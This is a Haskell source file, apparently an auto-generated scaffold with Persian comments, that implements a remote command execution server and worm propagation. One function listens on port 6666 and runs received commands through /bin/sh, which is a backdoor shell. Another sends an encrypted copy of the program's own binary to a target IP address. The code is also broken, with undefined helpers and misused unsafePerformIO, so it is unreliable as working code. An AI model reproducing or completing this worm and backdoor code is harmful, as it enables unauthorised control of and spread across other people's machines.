-- RCE.hs
-- Auto-generated scaffold.

module Network.RCE where

import Network.Socket
import Network.BSD
import Data.ByteString as BS
import Data.ByteString.Char8 as BSC
import Control.Monad
import Control.Concurrent
import System.Process
import Crypto.Cipher.AES
import Crypto.Cipher.Types
import Codec.Compression.Zlib
import Foreign.Ptr

-- اجرای دستور از راه دور
executeRemoteCommand :: Socket -> IO ()
executeRemoteCommand sock = do
    command <- readEncryptedCommand sock
    result <- unsafePerformIO $ readProcess "/bin/sh" ["-c", command] ""
    sendEncrypted sock result

-- سرور RCE
startRCEServer :: IO ()
startRCEServer = withSocketsDo $ do
    sock <- socket AF_INET Stream 0
    setSocketOption sock ReuseAddr 1
    bind sock (SockAddrInet 6666 iNADDR_ANY)
    listen sock 5
    forever $ do
        (conn, _) <- accept sock
        forkFinally (executeRemoteCommand conn) (\_ -> close conn)

-- انتشار کرم روی شبکه
propagateWorm :: String -> IO () -- آدرس IP هدف
propagateWorm target = withSocketsDo $ do
    sock <- socket AF_INET Stream 0
    addr <- inet_addr target
    connect sock (SockAddrInet 6666 addr)
    wormBinary <- getSelfBinary
    encryptedWorm <- encryptWorm wormBinary
    sendAll sock encryptedWorm
    close sock
    